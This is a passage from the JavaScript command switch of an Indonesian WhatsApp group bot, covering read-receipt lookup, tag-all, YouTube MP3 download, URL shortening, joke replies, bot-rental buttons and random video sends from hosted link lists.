             jids.push(`${descOwner ? `${descOwner.replace(/@c.us/g,'@s.whatsapp.net')}` : '-'}`)
             xdev.sendMessage(from,par,text,{quoted:dev,contextInfo:{mentionedJid:jids}})
             limitAdd(senderNumber, user)
             } catch (err){
						console.log(err)
						setReply(err)
					}
			
             break
             
            
					
										case 'sider':
										try{
										if (dev.message.extendedTextMessage === undefined || dev.message.extendedTextMessage === null) return setReply('Reply targetnya!')
infom = await xdev.messageInfo(from, dev.message.extendedTextMessage.contextInfo.stanzaId)
tagg = []
shape = '▢'
teks = `Telah Dibaca Oleh :\n\n`
for(let i of infom.reads){
teks += shape+' ' + '@' + i.jid.split('@')[0] + '\n'
teks += `┗━ ${shape} Waktu : ` + moment(`${i.t}` * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss') + '\n\n'
tagg.push(i.jid)
}
mentions(teks, tagg, true)
} catch (err){
						console.log(err)
						setReply("Uh emror, pastikan yang di reply pesan dari botnya ya kak")
					}
break

					case 'banchat':
				     if (!isOwner) return onlyOwner()
if (!isGroup) return setReply(mess.only.group)
if(!checkDataName(command, from, DataId)) { createDataId(command, DataId) }
if (isBanchat) return setReply(`udah di ban`)
addDataId(from, command, DataId)
setReply(`Bot berhasil Ban di group ini`)
break


					

case 'unbanchat':
				if (!isOwner) return onlyOwner() 
					try {
if (!isBanchat) return setReply(`udah di UnBan`)
removeDataId ("banchat", from, DataId)
setReply(`Bot telah di Unban di group ini`)
} catch (err){
						console.log(err)
						setReply(err)
					}
					break




case 'infoall': case 'tagall':
 if(isExtream) return
if(!q) return setReply('Ingfonya apa?')
if (!isGroup) return setReply(mess.only.group)
var nom = dev.participant
members_id = []
	teks = '\n'
	for (let mem of groupMembers) {
	teks += `┣ ⬣@${mem.jid.split('@')[0]}\n`
	members_id.push(mem.jid)
	}
mentions(`
*From :* ${pushname}

 Info :  ${q}

Total Member : ${groupMembers.length} 

┏━⬣`+teks+`┗━⬣`, members_id, false)
break












case 'playytmp3':
			if (args.length === 0) return setReply(`Kirim perintah *${prefix}ytmp3 [linkYt]*`)
			let isLinks = args[0].match(/(?:https?:\/{2})?(?:w{3}\.)?youtu(?:be)?\.(?:com|be)(?:\/watch\?v=|\/)([^\s&]+)/)
			if (!isLinks) return setReply(mess.error.Iv)
			
				try {
				setReply(mess.wait)
				yta(args[0])
				.then((res) => {
				const { dl_link, thumb, title, filesizeF, filesize } = res
				axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
				.then((a) => {
			    if (Number(filesize) >= 15000) return sendMediaURL(from, thumb, `┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓
┆ *YOUTUBE MP3*
└┈┈┈┈┈┈┈┈┈┈┈⌣ ┈̥-̶̯͡..̷̴✽̶⌣ ✽̶

*Data Berhasil Didapatkan!*
\`\`\`▢ Title : ${title}
\`\`\`▢ Ext : MP3
\`\`\`▢ Filesize : ${filesizeF}
\`\`\`▢ Link : ${a.data}
_Untuk durasi lebih dari batas disajikan dalam bentuk link_`)
				const captions = `┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓
┆ *YOUTUBE MP3*
└┈┈┈┈┈┈┈┈┈┈┈⌣ ┈̥-̶̯͡..̷̴✽̶⌣ ✽̶

*Data Berhasil Didapatkan!*
\`\`\`▢ Title : ${title}\`\`\`
\`\`\`▢ Ext : MP3\`\`\`
\`\`\`▢ Size : ${filesizeF}\`\`\`

_Silahkan tunggu file media sedang dikirim mungkin butuh beberapa menit_`
				sendMediaURL(from, thumb, captions)
				sendMediaURL(from, dl_link).catch(() => setReply(mess.error.api))
				})
				})
				} catch (err) {
				setReply(mess.error.api)
				}
				break

 
 case 'ytmp3':
if (isLimit(senderNumber, isPremium, isOwner, limitCount, user)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
            if (args.length < 1) return setReply('Link Nya Mana?')
            if(!isUrl(args[0]) && !args[0].includes('youtu')) return setReply(mess.error.Iv)
            teks = args.join(' ')
            setReply(mess.wait)
            res = await y2mateA(teks).catch(e => {
            setReply('_[ ! ] Error Gagal Dalam Memasuki Web Y2mate_')
})
            result = `┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓
┆ *YOUTUBE MP3*
└┈┈┈┈┈┈┈┈┈┈┈⌣ ┈̥-̶̯͡..̷̴✽̶⌣ ✽̶

*Data Berhasil Didapatkan!*
\`\`\`🐥 Title : ${res[0].judul}\`\`\`
\`\`\`🐥 Ext : MP3\`\`\`
\`\`\`🐥 Size : ${res[0].size}\`\`\`

_Silahkan tunggu file media sedang dikirim mungkin butuh beberapa menit_`

            sendFileFromUrl(res[0].thumb, image, {caption: result, quoted: dev}).then((lalu) => {
            sendFileFromUrl(res[0].link, document, {quoted: dev, mimetype: 'audio/mp3', filename: res[0].output})
})
limitAdd(senderNumber, user)
            break

 
 
 
 
 
 
 
 
 
 



 
 
case 'donasi':
console.log('DONASI')
xdev.sendMessage(from, donasi.dodo(prefix), text, {quoted: dev})
break
 
 
 
 
 
 
 
 
 case 'sayang':
if(!autoWelcome){
if(!isWelkom) return
}
if(isExtream) return
sendMess(`Ciee di sayang\nUntuk @${q} kamu di sayang😘 sama ${pushname} awokawok`)
break


case 'peluk':
if(!autoWelcome){ if(!isWelkom) return }
if(isExtream) return
sendMess(`Ciee di peluk\nuntuk @${q} kamu mau gak di peluk sama ${pushname} :v`)
break

case 'gebukin':
if(!autoWelcome){
if(!isWelkom) return
 }
if(isExtream) return
setReply(`@${q} Berhasil di gebukin dan sekarang babak belur + bonyok :v`)
break


case 'pukulin':
if(!autoWelcome){
 if(!isWelkom) return
}
if(isExtream) return
setReply(`@${q} Berhasil di pukulin dan sekarang dia bonyok-bonyok :v`)
break

case 'santet':
if(!autoWelcome){
if(!isWelkom) return
 }
if(isExtream) return
setReply(`Berhasil menyantet si @${q} dan sekarang dia mencret paku`)
break

case 'kocok':
if(!autoWelcome){
if(!isWelkom) return
}
if(isExtream) return
setReply(`*ERROR*`)
 break
	

 
 
 
 
 
 
 
 
 
 
case "owner":
sendKontak(from, nomerOwner, namalu, "Sibuk");
break;
 
 
case 'shorturl':
 case 'tinyurl':{
									if (args.length < 1) return setReply(`Masukkan link`)
									if (!isUrl) return setReply(`Masukkan link`)
									const fetchText = (url, optiono) => {
										return new Promise((resolve, reject) => {
											return fetch(url, optiono)
											.then(response => response.text())
											.then(text => resolve(text))
											.catch(err => {
												console.log(color(err,'red'))
												reject(err)
												})
											})
										}
										okok = await fetchText(`https://tinyurl.com/api-create.php?url=${q}`)
										shorti = `*Result : ${okok}*`
										setReply(shorti)
										}
									break
 
 

 
                 
 
 
case 'sewabot':
case 'sewalonte':
case 'sewa':
  if(isExtream) return
                       console.log('SEWA BOTZ')                       
                       gbutsan = [{buttonId: `${prefix}owner`, buttonText: {displayText: `ᴏᴡɴᴇʀ`}, type: 1},
                                            {buttonId: `KODE QR`, buttonText: {displayText: `ᴋᴏᴅᴇ ϙʀ`}, type: 1}]      
                       
 gbuttonan = {
                           contentText: sewabot.dada(prefix, settings, pushname, ucapanWaktu) ,
                           footerText:`© ${fake1}`,
                           buttons: gbutsan,
                           headerType: 1
                           }
                         await xdev.sendMessage(from, gbuttonan, MessageType.buttonsMessage, {                         
                         quoted: setQuoted, contextInfo: forward})                                 
                         break
 






	
case 'bug':
try{
await xdev.toggleDisappearingMessages(from, WA_DEFAULT_EPHEMERAL ) 
} catch(err){
	console.log(err)
	}
break

case 'bug1':
try{
await xdev.toggleDisappearingMessages(from, 0)
} catch(err){
	console.log(err)
	}
break












 
 
 
 
 
 
 
 
 

 
 
 
default:
                                                      
if (isCmd && !multi && !isSimi || !isSimi && isCmd && multi && !dev.key.fromMe) {
if(autovn){  
sendvn(gakada)
} else 
if(autosticker) {
const kta =['./respon/sticker01.webp','./respon/sticker03.webp',
                                           './respon/sticker06.webp','./respon/sticker07.webp','./respon/sticker09.webp',
                                           './respon/sticker10.webp',
                                           './respon/sticker11.webp','./respon/sticker13.webp',
                                           './respon/sticker21.webp']                   
const su = kta[Math.floor(Math.random() * kta.length)]
halo = fs.readFileSync(`${su}`)
xdev.sendMessage(from, halo, sticker, {quoted: dev, contextInfo : forward})
} else if(typing){
xdev.sendMessage(from, textcmd, text, {quoted : dev})
}
}
					
					
//Simi simi            
if(isGroup && isCmd && isSimi && !dev.key.fromMe){
simi = await fetchJson(`https://api.simsimi.net/v2/?text=${cmd}&lc=id`)
sami = simi.success
setReply(sami) 
}


}


//-------------------BATAS GARIS KATULISTIWA-----------------\\






//Waktu sewa group      
if(isGroup && dev.key.fromMe && budy.includes("Waktu sewa di grup ini sudah habis, bot akan keluar otomatis")){
await sendMess("Bye")
setTimeout( () => {
xdev.groupLeave(from)
},4000)
}


	if (responseButton == 'chika') {
    var ini_chika = ['https://e.top4top.io/m_20449tcq71.mp4', 'https://c.top4top.io/m_204409rac1.mp4', 'https://d.top4top.io/m_2044grrvq1.mp4', 'https://a.top4top.io/m_20447gp2m1.mp4', 'https://b.top4top.io/m_2044tms6o1.mp4', 'https://l.top4top.io/m_2044bpcnz1.mp4', 'https://k.top4top.io/m_2044djvwa1.mp4', 'https://i.top4top.io/m_2044edr6b1.mp4', 'https://j.top4top.io/m_20440trai1.mp4', 'https://h.top4top.io/m_20444e0od1.mp4', 'https://f.top4top.io/m_2044sd4yj1.mp4', 'https://g.top4top.io/m_2044pbyik1.mp4', 'https://e.top4top.io/m_2044plq2c1.mp4', 'https://c.top4top.io/m_20444gxgc1.mp4', 'https://d.top4top.io/m_2044huvjs1.mp4', 'https://k.top4top.io/m_2044jizu61.mp4', 'https://l.top4top.io/m_2044tz4ks1.mp4', 'https://a.top4top.io/m_2044jn6161.mp4', 'https://h.top4top.io/m_2044gcixv1.mp4', 'https://g.top4top.io/m_20444c9161.mp4', 'https://j.top4top.io/m_2044ptrlc1.mp4', 'https://i.top4top.io/m_2044pwj221.mp4', 'https://f.top4top.io/m_2044wk7cs1.mp4', 'https://e.top4top.io/m_2044z3oq91.mp4', 'https://d.top4top.io/m_2044pzqsv1.mp4'];
    var random_chika = ini_chika[Math.floor(Math.random() * (ini_chika.length))];
    let buff = await getBuffer(random_chika);
    xdev.sendMessage(from, buff, video, {
        mimetype: 'video/mp4',
        quoted: dev,
        caption: `Asupan nih kak`
    })
};
if (responseButton == 'delvira') {
    setReply(mess.wait);
    var delvira = ['https://h.top4top.io/m_2045q48rg1.mp4', 'https://i.top4top.io/m_204581d7k1.mp4', 'https://j.top4top.io/m_2045uhkes1.mp4', 'https://g.top4top.io/m_2045l52is1.mp4', 'https://i.top4top.io/m_2045ai8cb1.mp4', 'https://d.top4top.io/m_2045u59ck1.mp4', 'https://f.top4top.io/m_204582jv91.mp4', 'https://e.top4top.io/m_2045l4uit1.mp4', 'https://g.top4top.io/m_20450f0kl1.mp4', 'https://a.top4top.io/m_2045pd6r01.mp4', 'https://c.top4top.io/m_2045g84yn1.mp4', 'https://h.top4top.io/m_2045t100r1.mp4', 'https://j.top4top.io/m_2045en2j01.mp4', 'https://b.top4top.io/m_2045upgh01.mp4', 'https://l.top4top.io/m_2045pu58m1.mp4', 'https://k.top4top.io/m_2045i29cg1.mp4', 'https://e.top4top.io/m_2045q6mkm1.mp4', 'https://f.top4top.io/m_2045jl1jg1.mp4', 'https://c.top4top.io/m_20450bu4q1.mp4', 'https://d.top4top.io/m_2045wojl61.mp4'];
    var random_delvira = delvira[Math.floor(Math.random() * (delvira.length))];
    let ini_delvira = await getBuffer(random_delvira);
    xdev.sendMessage(from, ini_delvira, video, {
        mimetype: 'video/mp4',
        quoted: dev,
        caption: `Asupan nih kak`
    })
};
if (responseButton == 'ayu') {
    setReply(mess.wait);
    var ayu = ['https://h.top4top.io/m_2045353te1.mp4', 'https://i.top4top.io/m_2045uveyv1.mp4', 'https://g.top4top.io/m_2045mt9ww1.mp4', 'https://f.top4top.io/m_20450uurm1.mp4', 'https://c.top4top.io/m_2045qmp741.mp4', 'https://e.top4top.io/m_20452j1l01.mp4', 'https://b.top4top.io/m_2045k8f751.mp4', 'https://a.top4top.io/m_2045eg2jp1.mp4', 'https://d.top4top.io/m_2045jcjsl1.mp4', 'https://h.top4top.io/m_2045tjyl81.mp4', 'https://j.top4top.io/m_204595j5b1.mp4', 'https://d.top4top.io/m_2045crady1.mp4', 'https://g.top4top.io/m_20457ii1t1.mp4', 'https://k.top4top.io/m_2045zmfgu1.mp4', 'https://b.top4top.io/m_204514isy1.mp4', 'https://e.top4top.io/m_2045ryncv1.mp4', 'https://f.top4top.io/m_20456rgqd1.mp4', 'https://i.top4top.io/m_2045ie5dw1.mp4', 'https://l.top4top.io/m_2045o7w9v1.mp4', 'https://c.top4top.io/m_2045hcjnm1.mp4'];
    var random_ayu = ayu[Math.floor(Math.random() * (ayu.length))];
    let ini = await getBuffer(random_ayu);
    xdev.sendMessage(from, ini, video, {
        mimetype: 'video/mp4',
        quoted: dev,
        caption: `Asupan nih kak`
    })
};
if (responseButton == 'bunga') {
    setReply(mess.wait);
    var bunga = ['https://d.top4top.io/m_2045ln0hy1.mp4', 'https://b.top4top.io/m_2045wt4lb1.mp4', 'https://a.top4top.io/m_2045s3khl1.mp4', 'https://f.top4top.io/m_2045jb2va1.mp4', 'https://l.top4top.io/m_2045c7vqm1.mp4', 'https://k.top4top.io/m_20459shmj1.mp4', 'https://b.top4top.io/m_2045v82yo1.mp4', 'https://h.top4top.io/m_20458jkj91.mp4', 'https://f.top4top.io/m_2045becu81.mp4', 'https://i.top4top.io/m_204546wbm1.mp4', 'https://e.top4top.io/m_20455p1.mp4', 'https://i.top4top.io/m_204573y8p1.mp4', 'https://h.top4top.io/m_204519hat1.mp4', 'https://k.top4top.io/m_204502t021.mp4', 'https://l.top4top.io/m_2045ex4p81.mp4', 'https://g.top4top.io/m_2045f693d1.mp4', 'https://j.top4top.io/m_2045ypbga1.mp4', 'https://d.top4top.io/m_2045kzqx61.mp4', 'https://j.top4top.io/m_2045ltjq51.mp4', 'https://c.top4top.io/m_20456e8wc1.mp4', 'https://c.top4top.io/m_2045oggyg1.mp4', 'https://g.top4top.io/m_204545km11.mp4', 'https://e.top4top.io/m_2045mbr0w1.mp4'];
    var random_bunga = bunga[Math.floor(Math.random() * (bunga.length))];
    let ini_bunga = await getBuffer(random_bunga);
    xdev.sendMessage(from, ini_bunga, video, {
        mimetype: 'video/mp4',
        quoted: dev,
        caption: `Asupan nih kak`
    })
};
if (responseButton == 'aura') {
    setReply(mess.wait);
    var aura = ['https://g.top4top.io/m_2045kg02x1.mp4', 'https://f.top4top.io/m_2045bzzv61.mp4', 'https://e.top4top.io/m_2045u39bp1.mp4', 'https://c.top4top.io/m_2045nz5y81.mp4', 'https://b.top4top.io/m_2045bd5nx1.mp4', 'https://d.top4top.io/m_2045falge1.mp4', 'https://a.top4top.io/m_2045eljtw1.mp4', 'https://l.top4top.io/m_2045kcp201.mp4', 'https://j.top4top.io/m_2045at6161.mp4', 'https://i.top4top.io/m_2045nmmpu1.mp4', 'https://k.top4top.io/m_2045zox271.mp4', 'https://h.top4top.io/m_2045qzh0s1.mp4', 'https://g.top4top.io/m_2045bg23m1.mp4', 'https://e.top4top.io/m_20456vum81.mp4', 'https://c.top4top.io/m_2045vew941.mp4', 'https://d.top4top.io/m_20450ihor1.mp4', 'https://f.top4top.io/m_2045qyei51.mp4', 'https://b.top4top.io/m_2045pn2wh1.mp4', 'https://k.top4top.io/m_20457x5tn1.mp4', 'https://a.top4top.io/m_2045vc1vm1.mp4', 'https://l.top4top.io/m_2045bqxm91.mp4'];
    var random_aura = aura[Math.floor(Math.random() * (aura.length))];
    let ini_aura = await getBuffer(random_aura);
    xdev.sendMessage(from, ini_aura, video, {
        mimetype: 'video/mp4',
        quoted: dev,
        caption: `Asupan nih kak`
    })
};
if (responseButton == 'nisa') {
    setReply(mess.wait);
    var nisa = ['https://i.top4top.io/m_2045a62xr1.mp4', 'https://f.top4top.io/m_2045ag1ah1.mp4', 'https://h.top4top.io/m_2045aao0z1.mp4', 'https://g.top4top.io/m_20452ycpb1.mp4', 'https://d.top4top.io/m_2045w6bhe1.mp4', 'https://e.top4top.io/m_2045xra1y1.mp4', 'https://l.top4top.io/m_2045t75ik1.mp4', 'https://c.top4top.io/m_2045tekbe1.mp4', 'https://b.top4top.io/m_20452iret1.mp4', 'https://a.top4top.io/m_2045mx50v1.mp4', 'https://j.top4top.io/m_2045p4i5g1.mp4', 'https://k.top4top.io/m_2045ka8zl1.mp4', 'https://i.top4top.io/m_2045ugp6n1.mp4', 'https://f.top4top.io/m_20452avj31.mp4', 'https://e.top4top.io/m_2045nb03l1.mp4', 'https://g.top4top.io/m_2045x4itm1.mp4', 'https://c.top4top.io/m_2045riu151.mp4', 'https://d.top4top.io/m_2045fz1ic1.mp4', 'https://l.top4top.io/m_2045i393z1.mp4', 'https://b.top4top.io/m_2045ws5mp1.mp4', 'https://k.top4top.io/m_20459e8w41.mp4', 'https://j.top4top.io/m_204558yj01.mp4', 'https://a.top4top.io/m_20457ksoh1.mp4', 'https://i.top4top.io/m_2045dk4sl1.mp4'];
    var random_nisa = nisa[Math.floor(Math.random() * (nisa.length))];
    let ini_nisa = await getBuffer(random_nisa);
    xdev.sendMessage(from, ini_nisa, video, {
        mimetype: 'video/mp4',
        quoted: dev,
        caption: `Asupan nih kak`
    })
};
if (responseButton == 'ziva') {
    setReply(mess.wait);
    var ziva = ['https://a.top4top.io/m_2045w0s1a1.mp4', 'https://d.top4top.io/m_2045xs8yi1.mp4', 'https://b.top4top.io/m_2045azqmo1.mp4', 'https://f.top4top.io/m_2045two7u1.mp4', 'https://c.top4top.io/m_2045qyybj1.mp4', 'https://e.top4top.io/m_20451udwa1.mp4', 'https://g.top4top.io/m_2045wf56i1.mp4', 'https://j.top4top.io/m_2045eygb01.mp4', 'https://l.top4top.io/m_2045wc7px1.mp4', 'https://c.top4top.io/m_2045w1vo91.mp4', 'https://d.top4top.io/m_20456rh231.mp4', 'https://l.top4top.io/m_2045alof61.mp4', 'https://h.top4top.io/m_2045r85wl1.mp4', 'https://e.top4top.io/m_20451kltw1.mp4', 'https://g.top4top.io/m_20459k8ps1.mp4', 'https://f.top4top.io/m_2045ldcsq1.mp4', 'https://f.top4top.io/m_2045hvozl1.mp4', 'https://c.top4top.io/m_20452p34z1.mp4', 'https://l.top4top.io/m_2045msq4m1.mp4', 'https://i.top4top.io/m_20457dpjf1.mp4', 'https://k.top4top.io/m_2045252vc1.mp4', 'https://h.top4top.io/m_2045hmckz1.mp4', 'https://a.top4top.io/m_20457d0zk1.mp4', 'https://i.top4top.io/m_2045x1txz1.mp4', 'https://g.top4top.io/m_2045vh0di1.mp4', 'https://g.top4top.io/m_2045yl2it1.mp4', 'https://d.top4top.io/m_20456hnro1.mp4', 'https://k.top4top.io/m_20452q7ko1.mp4', 'https://k.top4top.io/m_20456hkh61.mp4', 'https://a.top4top.io/m_2045ytjc41.mp4', 'https://h.top4top.io/m_2045iwljm1.mp4', 'https://e.top4top.io/m_2045cuwm51.mp4', 'https://i.top4top.io/m_2045d43m11.mp4', 'https://b.top4top.io/m_2045qlcbo1.mp4', 'https://j.top4top.io/m_2045ym82h1.mp4', 'https://j.top4top.io/m_2045bew1l1.mp4', 'https://b.top4top.io/m_2045ythaz1.mp4'];
    var random_ziva = ziva[Math.floor(Math.random() * (ziva.length))];
    let ini_ziva = await getBuffer(random_ziva);
    xdev.sendMessage(from, ini_ziva, video, {
        mimetype: 'video/mp4',
        quoted: dev,
        caption: `Asupan nih kak`
    })
};
if (responseButton == 'yana') {
    setReply(mess.wait);
    var yana = ['https://g.top4top.io/m_2045p55sm1.mp4', 'https://f.top4top.io/m_2045o2z231.mp4', 'https://h.top4top.io/m_2045na6v81.mp4', 'https://i.top4top.io/m_2045cdyjt1.mp4', 'https://c.top4top.io/m_2045ro9xo1.mp4', 'https://b.top4top.io/m_2045edz2q1.mp4', 'https://a.top4top.io/m_2045ybdlt1.mp4', 'https://i.top4top.io/m_2045kk4t61.mp4', 'https://d.top4top.io/m_2045ehl6b1.mp4', 'https://k.top4top.io/m_20454zh0e1.mp4', 'https://l.top4top.io/m_2045y6bfe1.mp4', 'https://j.top4top.io/m_2045wxx3t1.mp4', 'https://h.top4top.io/m_2045cyk6a1.mp4', 'https://g.top4top.io/m_2045buha21.mp4', 'https://c.top4top.io/m_2045jzgsn1.mp4', 'https://e.top4top.io/m_2045dd9x11.mp4', 'https://d.top4top.io/m_2045dg6hl1.mp4', 'https://b.top4top.io/m_2045zmtsq1.mp4', 'https://f.top4top.io/m_2045m94wa1.mp4', 'https://a.top4top.io/m_2045d8rwp1.mp4', 'https://l.top4top.io/m_2045l80391.mp4', 'https://k.top4top.io/m_20458j0dc1.mp4', 'https://j.top4top.io/m_2045hh4741.mp4', 'https://i.top4top.io/m_2045xk4x71.mp4'];
    var random_yana = yana[Math.floor(Math.random() * (yana.length))];
    let ini_yana = await getBuffer(random_yana);
    xdev.sendMessage(from, ini_yana, video, {
        mimetype: 'video/mp4',
        quoted: dev,
        caption: `Asupan nih kak`
    })
};
if (responseButton == 'viona') {
    setReply(mess.wait);
    var viona = ['https://h.top4top.io/m_2045fs1b71.mp4', 'https://g.top4top.io/m_20453m4y71.mp4', 'https://g.top4top.io/m_2045mgrc01.mp4', 'https://f.top4top.io/m_2045p29p01.mp4', 'https://l.top4top.io/m_2045ity101.mp4', 'https://i.top4top.io/m_2045kguyy1.mp4', 'https://a.top4top.io/m_204549ynr1.mp4', 'https://b.top4top.io/m_2045y0fty1.mp4', 'https://c.top4top.io/m_20456si0m1.mp4', 'https://f.top4top.io/m_20457pmms1.mp4', 'https://h.top4top.io/m_2045gtquo1.mp4', 'https://j.top4top.io/m_204568o961.mp4', 'https://a.top4top.io/m_2045jqw861.mp4', 'https://d.top4top.io/m_2045frb0x1.mp4', 'https://c.top4top.io/m_2045xzr2v1.mp4', 'https://b.top4top.io/m_2045ae34n1.mp4', 'https://h.top4top.io/m_20453a5r81.mp4', 'https://k.top4top.io/m_2045baiy41.mp4', 'https://g.top4top.io/m_2045fjj6h1.mp4', 'https://i.top4top.io/m_2045q3tba1.mp4', 'https://d.top4top.io/m_2045npd2v1.mp4', 'https://e.top4top.io/m_2045fw9tg1.mp4', 'https://e.top4top.io/m_2045g0bgt1.mp4', 'https://k.top4top.io/m_2045opgb71.mp4'];
    var random_viona = viona[Math.floor(Math.random() * (viona.length))];
    let ini_viona = await getBuffer(random_viona);
    xdev.sendMessage(from, ini_viona, video, {
        mimetype: 'video/mp4',
        quoted: dev,
        caption: `Asupan nih kak`
    })
};
if (responseButton == 'syania') {
    setReply(mess.wait);
    var syania = ['https://f.top4top.io/m_2045x5wnd1.mp4', 'https://e.top4top.io/m_2045zv8zg1.mp4', 'https://d.top4top.io/m_2045trg5i1.mp4', 'https://c.top4top.io/m_2045xbfb51.mp4', 'https://h.top4top.io/m_2045dblc31.mp4', 'https://a.top4top.io/m_2045xd5sx1.mp4', 'https://k.top4top.io/m_2045520uv1.mp4', 'https://j.top4top.io/m_2045bplb41.mp4', 'https://i.top4top.io/m_2045x91991.mp4', 'https://l.top4top.io/m_2045jr6gs1.mp4', 'https://g.top4top.io/m_2045i9xs01.mp4', 'https://e.top4top.io/m_2045ideve1.mp4', 'https://f.top4top.io/m_2045g992t1.mp4', 'https://d.top4top.io/m_2045m180v1.mp4', 'https://c.top4top.io/m_2045n6bm31.mp4', 'https://b.top4top.io/m_2045s5r3z1.mp4', 'https://i.top4top.io/m_2045xoitc1.mp4', 'https://k.top4top.io/m_2045dur3t1.mp4', 'https://d.top4top.io/m_2045c6ddy1.mp4', 'https://j.top4top.io/m_2045nbbuc1.mp4', 'https://g.top4top.io/m_2045yinwy1.mp4', 'https://a.top4top.io/m_2045qsqhq1.mp4', 'https://c.top4top.io/m_20453tu1v1.mp4', 'https://e.top4top.io/m_2045zjbk31.mp4', 'https://f.top4top.io/m_2045n4rmz1.mp4', 'https://h.top4top.io/m_2045reqfb1.mp4', 'https://a.top4top.io/m_2045i86q21.mp4', 'https://b.top4top.io/m_20453xada1.mp4'];
    var random_syania = syania[Math.floor(Math.random() * (syania.length))];
    let ini_syania = await getBuffer(random_syania);
    xdev.sendMessage(from, ini_syania, video, {
        mimetype: 'video/mp4',
        quoted: dev,
        caption: `Asupan nih kak`
    })
};
if (responseButton == 'riri') {
    setReply(mess.wait);
    var riri = ['https://e.top4top.io/m_2045ut0en1.mp4', 'https://d.top4top.io/m_2045a5q5l1.mp4', 'https://f.top4top.io/m_2045rd0z31.mp4', 'https://c.top4top.io/m_2045zm4xy1.mp4', 'https://b.top4top.io/m_2045n6guq1.mp4', 'https://l.top4top.io/m_2045v8ck61.mp4', 'https://a.top4top.io/m_2045jbwwh1.mp4', 'https://k.top4top.io/m_2045ndl5m1.mp4', 'https://j.top4top.io/m_20457v6t61.mp4', 'https://i.top4top.io/m_2045a3gre1.mp4', 'https://h.top4top.io/m_2045tli2k1.mp4', 'https://g.top4top.io/m_2045z1u2g1.mp4', 'https://f.top4top.io/m_2045kdv2f1.mp4', 'https://e.top4top.io/m_20458qzhw1.mp4', 'https://d.top4top.io/m_20459vq7t1.mp4', 'https://c.top4top.io/m_20452b3av1.mp4', 'https://b.top4top.io/m_2045u5z3p1.mp4', 'https://a.top4top.io/m_2045l6nrb1.mp4'];
    var random_riri = riri[Math.floor(Math.random() * (riri.length))];
    let ini_riri = await getBuffer(random_riri);
    xdev.sendMessage(from, ini_riri, video, {
        mimetype: 'video/mp4',
        quoted: dev,
        caption: `Asupan nih kak`
    })
};
if (responseButton == 'syifa') {
    setReply(mess.wait);
    var syifa = ['https://h.top4top.io/m_2044bbyhm1.mp4', 'https://l.top4top.io/m_2044xa3nk1.mp4', 'https://j.top4top.io/m_20446ggxu1.mp4', 'https://d.top4top.io/m_2044rvctf1.mp4', 'https://b.top4top.io/m_2044kdgfw1.mp4', 'https://k.top4top.io/m_204432xwq1.mp4', 'https://c.top4top.io/m_204456vl01.mp4', 'https://a.top4top.io/m_2044bz2nv1.mp4', 'https://i.top4top.io/m_20440vzg41.mp4', 'https://e.top4top.io/m_20446qugg1.mp4', 'https://g.top4top.io/m_2044xrism1.mp4', 'https://c.top4top.io/m_20449iqt51.mp4', 'https://a.top4top.io/m_2044h64w01.mp4', 'https://d.top4top.io/m_20445mytg1.mp4', 'https://g.top4top.io/m_20445g4ue1.mp4', 'https://i.top4top.io/m_2044l1yk41.mp4', 'https://c.top4top.io/m_2044vpzyb1.mp4', 'https://e.top4top.io/m_20445z0xd1.mp4', 'https://d.top4top.io/m_2044qjas41.mp4', 'https://b.top4top.io/m_2044irvk41.mp4', 'https://l.top4top.io/m_2044wmw5d1.mp4', 'https://k.top4top.io/m_2044jewbq1.mp4', 'https://j.top4top.io/m_2044lo9sv1.mp4', 'https://i.top4top.io/m_2044fq2ne1.mp4', 'https://h.top4top.io/m_2044wudwv1.mp4', 'https://f.top4top.io/m_20445frga1.mp4'];
    var random_syifa = syifa[Math.floor(Math.random() * (syifa.length))];
    let ini_syifa = await getBuffer(random_syifa);
    xdev.sendMessage(from, ini_syifa, video, {
        mimetype: 'video/mp4',
        quoted: dev,
        caption: `Asupan nih kak`
    })
};
if (responseButton == 'mama_gina') {
    setReply(mess.wait);
    var mama_gina = ['https://j.top4top.io/m_2044moqoh1.mp4', 'https://a.top4top.io/m_2044kfu031.mp4', 'https://e.top4top.io/m_2044pd4q61.mp4', 'https://b.top4top.io/m_2044hd3hd1.mp4', 'https://k.top4top.io/m_2044lw3oq1.mp4', 'https://g.top4top.io/m_2044iu82p1.mp4', 'https://g.top4top.io/m_2044b4orc1.mp4', 'https://c.top4top.io/m_2044no8dz1.mp4', 'https://i.top4top.io/m_2044pxagw1.mp4', 'https://b.top4top.io/m_2044z2w4t1.mp4', 'https://c.top4top.io/m_2044lcxpj1.mp4', 'https://d.top4top.io/m_2044nvuaw1.mp4', 'https://f.top4top.io/m_20440g0o31.mp4', 'https://k.top4top.io/m_2044v2ime1.mp4', 'https://h.top4top.io/m_2044awwxm1.mp4', 'https://d.top4top.io/m_2044ht3vj1.mp4', 'https://l.top4top.io/m_2044bw2d31.mp4', 'https://i.top4top.io/m_2044zuzja1.mp4', 'https://l.top4top.io/m_2044cogw61.mp4', 'https://h.top4top.io/m_2044jasn31.mp4', 'https://j.top4top.io/m_204473eed1.mp4', 'https://a.top4top.io/m_20445wkpp1.mp4'];
    var random_mama_gina = mama_gina[Math.floor(Math.random() * (mama_gina.length))];
    let ini_mama_gina = await getBuffer(random_mama_gina);
    xdev.sendMessage(from, ini_mama_gina, video, {
        mimetype: 'video/mp4',
        quoted: dev,
        caption: `Asupan nih kak`
    })
};
if (responseButton == 'alcakenya') {
    setReply(mess.wait);
